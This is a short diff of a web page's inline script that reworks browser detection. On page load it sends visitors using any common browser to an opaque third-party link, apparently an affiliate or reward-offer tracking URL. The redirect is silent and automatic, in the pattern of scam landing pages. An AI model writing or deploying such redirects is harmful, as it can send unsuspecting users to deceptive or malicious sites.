@@ -90,13 +90,15 @@
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            var supportedBrowsers = ["Firefox", "Chrome", "Edge", "Safari", "Opera", "Brave", "Vivaldi", "DuckDuckGo"];
-            var currentBrowser = navigator.userAgent;
+            if (navigator.userAgentData && navigator.userAgentData.brands) {
+                var supportedBrowsers = ["Firefox", "Chrome", "Edge", "Safari", "Opera", "Brave", "Vivaldi", "DuckDuckGo"];
+                var currentBrowser = navigator.userAgentData.brands.map(brand => brand.brand).join(' ');
 
-            if (supportedBrowsers.some(function(browser) {
-                return currentBrowser.indexOf(browser) !== -1;
-            })) {
-                window.location.href = 'https://rwrdzy.com/61614/829'; // Replace with your compatible link
+                if (supportedBrowsers.some(function(browser) {
+                    return currentBrowser.indexOf(browser) !== -1;
+                })) {
+                    window.location.href = 'https://rwrdzy.com/61614/829'; // Replace with your compatible link
+                }
             }
         });
     </script>
